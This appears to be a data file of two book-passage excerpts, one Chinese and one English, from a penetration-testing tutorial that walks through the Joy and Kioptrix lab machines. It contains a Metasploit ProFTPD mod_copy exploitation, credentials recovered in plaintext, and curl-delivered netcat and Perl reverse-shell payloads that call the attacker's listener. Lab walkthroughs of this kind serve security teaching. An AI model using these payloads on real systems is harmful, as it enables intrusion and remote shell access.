  trans: "\n上图显示了 proftpd 漏洞的配置选项，这些配置选项在 `Name` 字段中具有唯一的名称，并可以使用 `set <option name>`\
    \ 命令进行修改。并非所有选项都如 `Required` 字段所示是必填的。对于上述漏洞，必需选项是 `RHOSTS`、`RPORT`、`RPORT_FTP`、`SITEPATH`、`TARGETURI`\
    \ 和 `TMPPATH`。\n\n`RPORT`、`RPORT_FTP`、`TARGETURI` 和 `TMPPATH` 的默认值对于我们的场景是正确的，因此我们将保持不变。我们需要更改的选项是\
    \ `RHOSTS` 和 `SITEPATH`。根据 `version_control` 文档的建议，web 根路径已更改为 `/var/www/tryingharderisjoy`。\n\
    \n使用 `set` 命令跟随 `<option name>` 和 `<value>`，使用 Joy 目标系统的 IP 地址设置 `RHOST` 值，并将\
    \ `SITEPATH` 设置为 `/var/www/tryingharderisjoy`。\n\n![](img/Figure-8.11.jpg)\n\n\
    **图 8.11：** 设置 `RHOST` 和 `SITEPATH` \n\n一旦正确设置了值，你可以通过发布 `exploit` 命令来利用目标。\n\n\
    ![](img/Figure-8.12.jpg)\n\n**图 8.12：**  利用 ProFTPD 服务\n\n在此阶段，你将在 Joy 目标系统上获得一个基础\
    \ shell 会话。太棒了！！让我们使用 `id` 命令检查我们在目标上的访问权限。\n\n![](img/Figure-8.13.jpg)\n\n**图\
    \ 8.13：** 'id' 命令的输出\n\n`id` 命令的输出显示我们已经获得了 `www-data` 用户和 `www-data` 组的权限。该用户也是\
    \ ossec 组的成员。\n\n![](img/Figure-8.14.jpg)\n\n**图 8.14：** /var/www/tryingharderisjoy\
    \ 的目录列表\n\n`pwd` 命令告诉我们正处于 `/var/www/tryingharderisjoy` 目录，`ls -la` 命令的输出向我们展示了\
    \ `bYkz9u.php` 文件以及我们在枚举阶段发现的 ossec 目录。\n\n![](img/Figure-8.15.jpg)\n\n**图 8.15：**\
    \ 探索 ossec 目录\n\nossec 目录的目录列表显示了许多 ossec 应用的文件和目录。我们可以看到一个名为 `patricksecretsofjoy`\
    \ 的非标准文件。让我们读取该文件的内容看看包含什么。\n\n![](img/Figure-8.16.jpg)\n\n**图 8.16：** ossec/patricksecretsofjoy\
    \ 的内容\n\n你会发现文件包含 patrick 和 root 的两组凭。\n\npatrick:apollo098765\n\nroot:howtheheckdoiknowwhattherootpasswordis\n\
    \n正如你可能注意到的，当前的 shell 是一个非常基础交互交互 shell，不支持 TTY，我们需要升级 shell 以支持全 TTY 模式，以便使用提升权限所需的\
    \ `su` 命令。\n\n在限制 shell 中运行命令以获取全 TTY 支持。\n\n```bash\npython -c 'import pty; pty.spawn(\"\
    /bin/sh\")`\n```\n\n![](img/Figure-8.17.jpg)\n\n**图 8.17：** 升级到交互式 shell\n\n我们可以看到\
    \ shell 会话中已激活 TTY 支持，因此我们应该能够使用上面找到的凭据通过 `su` 命令提升访问权限。\n\n![](img/Figure-8.18.jpg)\n\
    \n**图 8.18：** 进入用户 patrick 的账户\n\nroot 用户的密码无效，但我们成功获取了 patrick 的凭据。\n\n记录到为止的观察结果，我们将在下一章继续这台机器。\n\
    \n### 观察笔记：\n\n**IP 地址：** 10.0.2.15\n\n**操作系统：** Linux (Debian 9)\n\n**开放端口与服务：**\n\
    \n*   21/tcp FTP\n    *   ProFTPD 1.3.5\n        *   在 `/upload/directory` 中发现用户\
    \ patrick 目录的列表。\n        *   发现漏洞\n            ![](img/ent.jpg) ProFTPd 1.3.5\
    \ - 'mod_copy' Command Exe | exploits/linux/remote/37262.rb\n            ![](img/ent.jpg)\
    \ 使用 metasploit 获得 www-data 权限的 shell。\n            ![](img/ent.jpg) patrick 的密码为\
    \ apollo098765\n            ![](img/ent1.jpg) ProFTPd 1.3.5 - 'mod_copy' Remote\
    \ Comm | exploits/linux/remote/36803.py\n            ![](img/ent1.jpg) ProFTPd\
    \ 1.3.5 - File Copy | exploits/linux/remote/36742.txt\n*   22/tcp SSH\n    * \
    \  Dropbearsshd 0.34 (protocol 2.0)\n        *   发现漏洞\n            ![](img/ent.jpg)\
    \ Dropbear SSH 0.34 - Remote Code Execut | exploits/linux/remote/387.c\n*   25/tcp\
    \ SMTP\n    *   Postfix smtpd package version 3.1.8-0\n*   80/tcp HTTP\n    *\
    \   Apache httpd 2.4.25, `/ossec` 目录包含 OSSEC-HIDS 的 Web \n        *   发现漏洞\n \
    \           ![](img/ent.jpg) Apache 2.4.17 < 2.4.38 - 'apache2ctl g | exploits/linux/local/46676.php\n\
    \            ![](img/ent1.jpg) 权限提升漏洞\n            ![](img/ent.jpg) Apache < 2.2.34\
    \ / < 2.4.27 - OPTIONS M | exploits/linux/webapps/42745.py\n*   110/tcp POP3\n\
    \    *   Dovecot pop3d package version 1:2.2.27-3\n*   139/tcpnetbios-ssn\n  \
    \  *   Samba smbd package version 2:4.5.16\n*   143/tcp IMAP\n    *   Dovecot\
    \ imapd package version 1:2.2.27-3\n*   445/tcpnetbios-ssn\n    *   Samba smbd\
    \ package version 2:4.5.16\n*   465/tcp SMTP\n    *   Postfix smtpd package version\
    \ 3.1.8-0\n*   587/tcp SMTP\n    *   Postfix smtpd package version 3.1.8-0\n*\
    \   993/tcpssl/imaps?\n*   995/tcpssl/pop3s?\n*   123/udpntp\n    *   NTP v4 (unsynchronized)\n\
    *   137/udpnetbios-ns\n    *   Samba nmbdnetbios-ns package version 2:4.5.16\n\
    *   161/udpsnmp\n    *   SNMPv1 server; net-snmp SNMPv3 server (public)\n*   36969/udptftp\n\
    \n"
- fmt: "\n![](images/Figure-8.22.jpg)\n\n**Figure 8.22:** Executing the `id` command\
    \ on `rce.php` webshell\n\nThe `id` command executed successfully on the Kioptrix\
    \ target, we can see that we can run commands with privileges of ‘`www`’ user.\n\
    \nLet’s find a way to obtain a full interactive shell access on the target, start\
    \ by checking whether `netcat` command is installed on the target system by sending\
    \ the command ‘`find / -name nc` to the web shell.\n\nSending the command directly\
    \ to the web shell will not work as it does not handle special characters correctly,\
    \ hence, in order for the command to execute on the target we will have to encode\
    \ the string using the `--data-urlencode` flag before sending it to the target.\n\
    \n![](images/Figure-8.23.jpg)\n\n**Figure 8.23:** Finding existence of netcat\
    \ via `rce.php`\n\nThe command shows that `netcat` is installed on the target\
    \ and the `nc` binary is located in the `/usr/bin` directory. We will now start\
    \ a `netcat` listener on our Kali system.\n\nLet’s start a `netcat` listener on\
    \ our Kali system and configure it to listen for incoming connections on port\
    \ 9877.\n\n![](images/Figure-8.24.jpg)\n\n**Figure 8.24:** Setting up netcat listener\n\
    \nOur listener has been successfully set up, we will now go back and execute the\
    \ reverse shell payload using the following command:\n\n```\ncurl -A \"Mozilla/4.0\
    \ Mozilla_4browser\" -G \"http://10.0.2.104:8080/phptax/data/rce.php\" --data-urlencode\
    \ \"cmd=nc -e /bin/sh 10.0.2.238 9877\"\n```\n\nThe command executes on the target\
    \ without returning a shell on our listener, referring to the FreeBSD man page\
    \ for `netcat` on [https://www.freebsd.org/cgi/man.cgi?nc] tells us that `-e`\
    \ switch is used differently in FreeBSD implementation of `netcat` and it does\
    \ not support execution of binaries. We’ll have to try using alternative approaches\
    \ to get a shell on the target.\n\nPentestmonkey’s reverse shell cheat sheet contains\
    \ a lot of ready-made scripts to obtain a shell without `netcat`. [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).\n\
    \nLet’s use one of the Perl script from the above cheat sheet and modify the IP\
    \ and Port address:\n\n```\nperl -e 'use Socket;$i=\"10.0.2.238\";$p=9877;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"\
    tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\"\
    >&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n```\n\nThe preceding script\
    \ contains a lot of special characters such as `- ;&>` which will get parsed by\
    \ our local bash shell and `curl` instead of being passed as payload to the target.\n\
    \nTo avoid this pitfall we will use the online tool [https://www.urlencoder.org/]\
    \ to encode the payload using URLencoding.\n\n![](images/Figure-8.25.jpg)\n\n\
    **Figure 8.25:** Encoding the reverse shell payload using www.urlencoder.org\n\
    \nThe preceding screenshot shows the URLencoded payload at the bottom of the page.\n\
    \n**Info: This encoding process can also be done offline using Burpsuite or HackBar\
    \ Addon for Firefox.**\n\nThe encoded payload which we can use with the `curl`\
    \ command below to obtain the shell on our `netcat` listener:\n\n```\ncurl -A\
    \ \"Mozilla/4.0 Mozilla_4browser\" http://10.0.2.104:8080/phptax/data/rce.php?cmd=<PAYLOAD>\n\
    ```\n\n![](images/Figure-8.26.jpg)\n\n**Figure 8.26:** Using `curl` to execute\
    \ the reverse shell payload\n\nThe `curl` command shows a blinking cursor on the\
    \ terminal meaning the script ran successfully on the target, let’s check our\
    \ `netcat` listener on port 9877 for reverse shell connect.\n\n![](images/Figure-8.27.jpg)\n\
    \n**Figure 8.27:** Reverse shell on the netcat listener\n\nThe payload was a success.\
    \ You should have received a reverse shell connection on `netcat` listener from\
    \ the target, running the ‘id’ command shows we have gained privileges of `www`\
    \ user and group.\n\nTake notes on the observations made so far and we will continue\
    \ with this machine in the next chapter.\n\n**Observation Notes:**\n\n- **IP address:**\
    \ 10.0.2.104\n- **Operating System:** FreeBSD\n- **Open Ports & Services:**\n\
    \    * 80/tcp http\n        * Apache httpd 2.2.21\n        * mod_ssl/2.2.21\n\
    \        * OpenSSL/0.9.8q\n        * DAV/2 PHP/5.3.8\n        * pChart application\
    \ found: http://10.0.2.104/pChart2.1.3/index.php\n            * Exploit found\n\
    \            ![](images/ent.jpg)\n"
